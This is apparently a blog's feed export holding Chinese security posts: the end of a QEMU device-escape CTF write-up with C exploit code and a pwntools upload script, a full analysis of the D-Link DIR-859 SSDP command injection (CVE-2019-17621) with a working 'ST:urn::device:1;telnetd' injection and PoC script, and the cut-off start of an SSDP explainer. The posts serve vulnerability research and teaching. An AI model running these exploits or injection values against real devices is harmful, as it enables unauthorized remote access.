(<span class="keyword">uint32_t</span>)(((i + x) ^ ((x &gt;&gt; <span class="number">5</span>)) ^ (  x &lt;&lt; <span class="number">4</span>)) + y);</span><br><span class="line">    &#125; <span class="keyword">while</span> (i != <span class="number">0xC6EF3720</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"x = %p, y = %p , i = %p\n"</span>,x,y,i);</span><br><span class="line">    <span class="keyword">uint64_t</span> ans = (y &lt;&lt; <span class="number">32</span>) + x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ans = %p\n"</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> ans - <span class="number">0x4AEB0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">uint64_t</span> rr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> i , x ;</span><br><span class="line">    <span class="keyword">uint64_t</span> y;</span><br><span class="line"></span><br><span class="line">    i  = <span class="number">0xC6EF3720</span>;</span><br><span class="line">    x = rr &amp; <span class="number">0xffffffff</span> ; </span><br><span class="line">    y = rr &gt;&gt; <span class="number">32</span> ;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        y = (<span class="keyword">uint32_t</span>)(y - ((x + i) ^ (x &gt;&gt; <span class="number">5</span>) ^ ( x &lt;&lt; <span class="number">4</span> )));</span><br><span class="line">        x = x - (((y + i) ^ (y &gt;&gt; <span class="number">5</span>) ^ ( y &lt;&lt; <span class="number">4</span> ) )) ;</span><br><span class="line">        i = i + <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"x = %p, y = %p , i = %p\n"</span>,x,y,i);</span><br><span class="line">    <span class="keyword">return</span>  (y &lt;&lt; <span class="number">32</span>) + x;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> tmp = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> tmp1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> tmp2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    tmp = mmio_read(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"tmp test = %p\n"</span>, tmp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">"I/O permission is not enough"</span>);</span><br><span class="line"></span><br><span class="line">    reset_keys();</span><br><span class="line">    set_seek_off(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">// get rand_r </span></span><br><span class="line">    <span class="keyword">uint64_t</span> yy;</span><br><span class="line">    <span class="keyword">uint32_t</span> xx;</span><br><span class="line">    yy = mmio_read(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"tmp1 test = %p\n"</span>, yy); <span class="comment">// part 1</span></span><br><span class="line">    xx = mmio_read(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"tmp2 test = %p\n"</span>, xx); <span class="comment">// part 2 high</span></span><br><span class="line">    libc_base = decrypt(xx,yy);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"libc_base = %p\n"</span>,libc_base);</span><br><span class="line">    <span class="keyword">uint64_t</span> system = libc_base + <span class="number">0x0000000000055410</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"system = %p\n"</span>,system);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">24</span>, (<span class="keyword">uint32_t</span>)(encrypt(system)));</span><br><span class="line">    mmio_write(<span class="number">24</span>, (<span class="keyword">uint32_t</span>)(encrypt(system) &gt;&gt; <span class="number">32</span>));</span><br><span class="line">    <span class="comment">// char sed[4] = "cat ";</span></span><br><span class="line">    <span class="comment">// char flag[8] = "/home/ct";</span></span><br><span class="line">    <span class="comment">// char flag2[8] = "f/flag\x00";</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flag1 = <span class="number">0x20746163</span>; <span class="comment">//"cat "</span></span><br><span class="line">    <span class="keyword">uint64_t</span> flag2 = <span class="number">0x67616c66</span>; <span class="comment">// "flag"</span></span><br><span class="line">    <span class="comment">// uint64_t flag3 = 0x67616c662f66;</span></span><br><span class="line">    set_seek_off(<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0</span>, (<span class="keyword">uint32_t</span>)(encrypt(flag2)));</span><br><span class="line">    mmio_write(<span class="number">0</span>, (<span class="keyword">uint32_t</span>)(encrypt(flag2) &gt;&gt; <span class="number">32</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mmio_write(8, (uint32_t)(encrypt(flag3)));</span></span><br><span class="line">    <span class="comment">// mmio_write(8, (uint32_t)(encrypt(flag3) &gt;&gt; 32));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">28</span> + pmio_base,flag1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-远程exp"><a href="#0x04-远程exp" class="headerlink" title="0x04 远程exp"></a>0x04 远程exp</h2><p>模板来自[这里]([[Pwn 笔记]Linux Kernel 调试文件总结 | binLep’s Blog](<a href="https://binlep.github.io/2020/03/12/[Pwn" target="_blank" rel="noopener">https://binlep.github.io/2020/03/12/[Pwn</a> 笔记]Linux Kernel 调试文件总结/))</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">cmd = <span class="string">'/ #'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'stty -echo'</span>)</span><br><span class="line">    os.system(<span class="string">'gcc -static -O0 ./d3dev.c -o ./exp'</span>)</span><br><span class="line">    os.system(<span class="string">'gzip -c ./exp &gt; ./exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'cat &lt;&lt;EOF &gt; exp.gz.b64'</span>)</span><br><span class="line">    r.sendline((read(<span class="string">'./exp.gz'</span>)).encode(<span class="string">'base64'</span>))</span><br><span class="line">    r.sendline(<span class="string">'EOF'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'base64 -d exp.gz.b64 &gt; exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'gunzip ./exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'chmod +x ./exp'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'./exp'</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./startvm.sh', shell=True)</span></span><br><span class="line">p = remote(<span class="string">'106.14.216.214'</span>,<span class="number">50273</span>)</span><br><span class="line"></span><br><span class="line">exploit(p)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;qemu 是纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备。目前qemu出问题比较多的地方以及比赛中出题目的形式都在在设备模拟中。&lt;/p&gt;
&lt;p&gt;所以其实这种题型一般就是关注它描述设备自定义的那个设备结构体还有与这个设备通信的相关函数。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="wood1314.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="qemu" scheme="wood1314.github.io/tags/qemu/"/>
    
  </entry>
  
  <entry>
    <title>D-Link DIR-859 及其系列上存在的ssdpcgi未认证命令执行漏洞(CVE-2019–17621)</title>
    <link href="wood1314.github.io/year/02/05/clgvp3n4k000p6n3flirkfexp/"/>
    <id>wood1314.github.io/year/02/05/clgvp3n4k000p6n3flirkfexp/</id>
    <published>2021-02-05T01:51:07.000Z</published>
    <updated>2021-02-05T01:59:44.787Z</updated>
    
    <content type="html"><![CDATA[<p>最近打算针对一个类型的漏洞进行仔细的分析，希望能通过这个漏洞的分析总结归纳出具有这个漏洞的设备的特点，利于指导之后的漏洞挖掘。<br>目前的分析思路：<br>    1. 首先分析该漏洞在DIR-859上的形成原因，利用思路。<br>        2. 查看其他受影响的设备漏洞形成原因和利用方式与该DIR-859上有何不同<br>        3. 研究官方补丁，看看官方如何修补该漏洞<br>        4. 研究除了DLINk系列，其他系列的设备处理SSDP的流程是否也存在类似问题</p><a id="more"></a><h3 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h3><p>主要是在ssdpcgi函数中发现了该漏洞，且因为SSDP协议缘故，该漏洞利用无须通过认证<br>漏洞起因主要是因为环境变量没有进行字符过滤</p><ol><li><p>漏洞研究版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">型号：DIR-859</span><br><span class="line">固件版本：1.06b01 Beta01，1.05</span><br><span class="line">架构：MIPS 32位</span><br></pre></td></tr></table></figure></li><li><p>目前搜集到的受影响的Dlink版本<br><img src="/05/clgvp3n4k000p6n3flirkfexp/1.png" alt></p><h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>首先分析一下这个ssdpcgi函数的逻辑<br>首先是a1,也就是参数个数。随后获取了四个环境变量<br><img src="/05/clgvp3n4k000p6n3flirkfexp/2.png" alt="ccad2c09a97638c032bb6c7814e2e0b7.png"><br>HTTP_ST这个字段主要是关系到搜索的方式，根据函数逻辑一共有4种发现设备的方式</p></li><li><p>ssdp:all 搜索所有的UPnP设备以及服务</p></li><li><p>upnp:rootdevice：搜索root设备</p></li><li><p>uuid: 查询特定uuid的设备</p></li><li><p>urn: 查询指定类型的设备</p></li></ol><p>以下是四种情况的处理流程，可以看到最终都会执行lxmldbc_system这个函数来执行M-SEARCH.sh这个脚本来查询设备<br>最后执行的命令基本格式就是两种，xxxx就是可以注入的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/scripts/upnp/M-SEARCH.sh ssdpall adddr:port id &amp;</span><br><span class="line">/etc/scripts/upnp/M-SEARCH.sh uuid adddr:port id uuid:xxxxxx&amp;</span><br></pre></td></tr></table></figure><p>所以只要将ST字段设置为uuid或者urn就可以在最后拼接自己构造的ST<br>还有就是其他人的poc都是说只能用urn：构造后利用。但我觉得uuid也是可以的。<br><img src="/05/clgvp3n4k000p6n3flirkfexp/3.png" alt="60f9b44fd4272eb6602119af5b24ab1f.png"><br>现在我先把路由器模拟起来试一下，使用firmadyne进行模拟<br><img src="/05/clgvp3n4k000p6n3flirkfexp/4.png" alt="06cb32a32c2c76412b8c845ada7fecb9.png"><br>尝试如此构造header注入，成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] Preparando Header ...</span><br><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">HOST:192.168.0.1:1900</span><br><span class="line">ST:urn::device:1;telnetd</span><br><span class="line">MX:2</span><br><span class="line">MAN:&quot;ssdp:discover&quot;</span><br></pre></td></tr></table></figure><p>果然uuid也可以，header的ST部分也可以如此构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header += &quot;ST:uuid:1;telnetd\n&quot;</span><br></pre></td></tr></table></figure><p><img src="/05/clgvp3n4k000p6n3flirkfexp/5.png" alt="928033f201fa083f28dc313c4df4743e.png"></p><h4 id="测试使用的反向连接poc脚本"><a href="#测试使用的反向连接poc脚本" class="headerlink" title="测试使用的反向连接poc脚本"></a>测试使用的反向连接poc脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="comment"># Exploit By Miguel Mendez - @s1kr10s</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">config_payload</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">    header = <span class="string">"M-SEARCH * HTTP/1.1\n"</span></span><br><span class="line">    header += <span class="string">"HOST:"</span>+str(ip)+<span class="string">":"</span>+str(port)+<span class="string">"\n"</span></span><br><span class="line">    header += <span class="string">"ST:urn::device:1;telnetd\n"</span></span><br><span class="line">    <span class="comment"># header += "ST:uuid:1;telnetd\n"</span></span><br><span class="line">    header += <span class="string">"MX:2\n"</span></span><br><span class="line">    header += <span class="string">'MAN:"ssdp:discover"'</span>+<span class="string">"\n\n"</span></span><br><span class="line">    <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_conexion</span><span class="params">(ip, port, payload)</span>:</span></span><br><span class="line">    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)</span><br><span class="line">    sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,<span class="number">2</span>)</span><br><span class="line">    sock.sendto(payload,(ip, port))</span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>:</span><br><span class="line">    ip = raw_input(<span class="string">"Router IP: "</span>)</span><br><span class="line">    port = <span class="number">1900</span></span><br><span class="line">    headers = config_payload(ip, port)</span><br><span class="line">    print(<span class="string">"\n---= HEADER =---\n"</span>)</span><br><span class="line">    print(<span class="string">"[+] Preparando Header ..."</span>)</span><br><span class="line">    <span class="keyword">print</span> headers</span><br><span class="line">    print(<span class="string">"[+] Enviando payload ..."</span>)</span><br><span class="line">    print(<span class="string">"[+] Activando servicio telnetd :)"</span>) </span><br><span class="line">    send_conexion(ip, port, headers)</span><br><span class="line">    print(<span class="string">"[+] Conectando al servicio ...n"</span>)</span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    os.system(<span class="string">'telnet '</span> + str(ip))</span><br></pre></td></tr></table></figure><h3 id="0x03-针对DIR859上漏洞的总结"><a href="#0x03-针对DIR859上漏洞的总结" class="headerlink" title="0x03 针对DIR859上漏洞的总结"></a>0x03 针对DIR859上漏洞的总结</h3><p>经过分析我觉得造成这个UPnp漏洞的原因主要有以下两点</p><ol><li><strong>环境变量并未进行字符过滤</strong></li><li>利用SSDP进行查询时，发现根设备和遍历设备两种模式都不需要额外参数，因此不会造成命令执行注入。<strong>但是针对于特定类型设备的查询时比如利用uuid和urn来指定时</strong>，指定的信息会成为system命令执行参数的一部分，而这部分就可以造成命令执行注入了。而且包括REMOTE_ADDR和REMOTE_PORT是都没有对其进行过滤，因此这两个是也可以注入的</li></ol><h3 id="0x04-其他DLink路由器上的ssdpcgi行为分析"><a href="#0x04-其他DLink路由器上的ssdpcgi行为分析" class="headerlink" title="0x04 其他DLink路由器上的ssdpcgi行为分析"></a>0x04 其他DLink路由器上的ssdpcgi行为分析</h3><h4 id="1-DIR885L"><a href="#1-DIR885L" class="headerlink" title="1 DIR885L"></a>1 DIR885L</h4><p>DIR885LA (1.20b02) 是已经经过了修补的</p><p>首先一样的是获取四个环境变量的操作，但是sub_17788对ST进行了一些操作</p><p><img src="/05/clgvp3n4k000p6n3flirkfexp/6.png" alt="df7e2fc7cbcc5bdeb5348c5b0c8390c0.png"></p><p>让我们跟进sub_17788看看其做了什么操作，发现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_17788</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="keyword">sizeof</span>(v13));</span><br><span class="line">  <span class="comment">//首先看首部是不是uuid</span></span><br><span class="line">  result = <span class="built_in">strncmp</span>(a1, <span class="string">"uuid:"</span>, <span class="number">5u</span>);</span><br><span class="line">  <span class="comment">//如果不是uuid，那么就应该是urn来指定设备</span></span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//每次循环将urn指定的设备格式和它硬编码在程序里的一个字典循环比较，如果字典比较完了还没有匹配就直接置0退出</span></span><br><span class="line">      <span class="keyword">if</span> ( !off_30354[v14] )</span><br><span class="line">      &#123;</span><br><span class="line">        dword_30350 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="built_in">strcmp</span>(off_30354[v14], a1);</span><br><span class="line">      <span class="keyword">if</span> ( !result )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++v14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果匹配到了相应字典就把该设备名称输入到变量里</span></span><br><span class="line">    result = <span class="built_in">snprintf</span>(byte_3051C, <span class="number">0x400</span>u, <span class="string">"%s"</span>, off_30354[v14]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//如果是uuid就利用格式化字符串转化成uuid的格式</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(v13, <span class="number">0x400</span>u, <span class="string">"%s"</span>, a1 + <span class="number">5</span>);</span><br><span class="line">    v2 = strtok(v13, <span class="string">"-"</span>);</span><br><span class="line">    v3 = strtol(v2, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    v4 = strtok(<span class="number">0</span>, <span class="string">"-"</span>);</span><br><span class="line">    v5 = strtol(v4, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    v6 = strtok(<span class="number">0</span>, <span class="string">"-"</span>);</span><br><span class="line">    v7 = strtol(v6, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    v8 = strtok(<span class="number">0</span>, <span class="string">"-"</span>);</span><br><span class="line">    v9 = strtol(v8, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    v10 = strtok(<span class="number">0</span>, <span class="string">"-"</span>);</span><br><span class="line">    v11 = strtoll(v10, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    result = <span class="built_in">snprintf</span>(byte_3051C, <span class="number">0x400</span>u, <span class="string">"uuid:%08X-%04X-%04X-%04X-%012llX"</span>, v3, v5, v7, v9, v11);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-DIR-865L"><a href="#2-DIR-865L" class="headerlink" title="2 DIR-865L"></a>2 DIR-865L</h4><p>版本1.07b01<br>漏洞与DIR-859基本没有区别，漏洞点与漏洞代码完全一致</p><h3 id="0x05-其他厂商路由器对SSDP的实现"><a href="#0x05-其他厂商路由器对SSDP的实现" class="headerlink" title="0x05 其他厂商路由器对SSDP的实现"></a>0x05 其他厂商路由器对SSDP的实现</h3><h4 id="1-ASUS-WRT-AC66U"><a href="#1-ASUS-WRT-AC66U" class="headerlink" title="1 ASUS WRT-AC66U"></a>1 ASUS WRT-AC66U</h4><p>利用下面这个命令找到usr/sbin/miniupnpd，这个二进制文件应该是提供SSDP服务的<br>看名称感觉华硕使用的是开源的miniupnp模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rnl &quot;upnp&quot;</span><br></pre></td></tr></table></figure><p>接着逆向分析固件，搜索ssdp相关函数（也可以搜索ST字符串）找到对应的逻辑</p><p>同样关注点在选择特定参数或者uuid的查询上，核心逻辑就是下面这个图</p><p>可以看到他每次查询都是从一个已经查询好的列表里不停匹配（rootDevice)，匹配成功了就返回成功的结果，不存在用户输入被执行了的结果<br><img src="/05/clgvp3n4k000p6n3flirkfexp/7.png" alt="9742c40625a584096abbe1d839ba3deb.png"> </p><h4 id="2-FAST-FER-450"><a href="#2-FAST-FER-450" class="headerlink" title="2 FAST-FER 450"></a>2 FAST-FER 450</h4><p>与AC66U一样，同样使用miniupnpd，代码基本一致</p><h4 id="3-网剑R6700"><a href="#3-网剑R6700" class="headerlink" title="3 网剑R6700"></a>3 网剑R6700</h4><p>自己实现的一个过程，完整过程还需研究</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>CVE-2019–17621: D-Link DIR-859 未授权命令执行漏洞分析 - 安全客，安全资讯平台 (anquanke.com)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近打算针对一个类型的漏洞进行仔细的分析，希望能通过这个漏洞的分析总结归纳出具有这个漏洞的设备的特点，利于指导之后的漏洞挖掘。&lt;br&gt;目前的分析思路：&lt;br&gt;    1. 首先分析该漏洞在DIR-859上的形成原因，利用思路。&lt;br&gt;        2. 查看其他受影响的设备漏洞形成原因和利用方式与该DIR-859上有何不同&lt;br&gt;        3. 研究官方补丁，看看官方如何修补该漏洞&lt;br&gt;        4. 研究除了DLINk系列，其他系列的设备处理SSDP的流程是否也存在类似问题&lt;/p&gt;
    
    </summary>
    
      <category term="IOT" scheme="wood1314.github.io/categories/IOT/"/>
    
    
      <category term="IOT" scheme="wood1314.github.io/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>SSDP协议</title>
    <link href="wood1314.github.io/year/02/05/clgvp3n5i001k6n3fr4hsrj2l/"/>
    <id>wood1314.github.io/year/02/05/clgvp3n5i001k6n3fr4hsrj2l/</id>
    <published>2021-02-05T01:21:28.000Z</published>
    <updated>2021-02-05T01:49:19.098Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSDP协议"><a href="#SSDP协议" class="headerlink" title="SSDP协议"></a>SSDP协议</h2><h3 id="0x01何为SSDP"><a href="#0x01何为SSDP" class="headerlink" title="0x01何为SSDP"></a>0x01何为SSDP</h3><p>SSDP 使用一个固定的组播地址 239.255.255.250 和 UDP 端口号 1900 来监听其他设备的请求。SSDP 协议的请求消息有两种类型，第一种是服务通知，设备和服务使用此类通知消息声明自己存在；第二种是查询请求，协议客户端用此请求查询某种类型的设备和服务。</p><a id="more"></a><p>“为了能被网络搜索发现，目标设备应该向发起多播请求的源IP地址及端口发送单播UDP响应。如果M-SEARCH请求报文的ST头部字段以“ssdp:all”、“upnp:rootdevice”或者“uuid:”开头，后面跟着与设备相匹配的UUID信息，或者如果M-SERCH请求与设备支持的设备类型或服务类型相匹配，那么该设备就会应答M-SEARCH请求报文”。这种策略在实际环境中能够正常工作。例如，我的Chrome浏览器经常会请求搜索智能电视：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tcpdump -ni eth0 udp and port 1900 -A IP 192.168.1.124.53044 &gt; 239.255.255.250.1900: UDP, length 175   </span><br><span class="line">M-SEARCH * HTTP/1.1   </span><br><span class="line">HOST: 239.255.255.250:1900   </span><br><span class="line">MAN: &quot;ssdp:discover&quot;   </span><br><span class="line">MX: 1   </span><br><span class="line">ST: urn:dial-multiscreen-org:service:dial:1   </span><br><span class="line">USER-AGENT: Google Chrome/58.0.3029.110 Windows</span><br></pre></td></tr></table></figure><p>这个报文被发往一个多播IP地址。监听这一地址的其他设备如果与报文头部中指定的ST（search-target，搜索目标）多屏幕类型设备相匹配，那么这些设备应该会响应这个请求报文。除了请求具体的设备类型，请求报文中还可以包含两类“通用的”ST查询类型：<br>1、upnp:rootdevice：搜索root设备<br>2、ssdp:all：搜索所有的UPnP设备以及服务你可以运行以下python脚本（在另一脚本的基础上修改而得），使用前面提到的这些ST查询类型来枚举网络中的设备列表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python2 </span></span><br><span class="line"><span class="keyword">import</span> socket   </span><br><span class="line"><span class="keyword">import</span> sys dst = <span class="string">"239.255.255.250"</span>   </span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:       </span><br><span class="line">    dst = sys.argv[<span class="number">1</span>] </span><br><span class="line">st = <span class="string">"upnp:rootdevice"</span>   </span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">2</span>:      </span><br><span class="line">    st = sys.argv[<span class="number">2</span>] </span><br><span class="line">msg = [       </span><br><span class="line">    <span class="string">'M-SEARCH * HTTP/1.1'</span>,   </span><br><span class="line">    <span 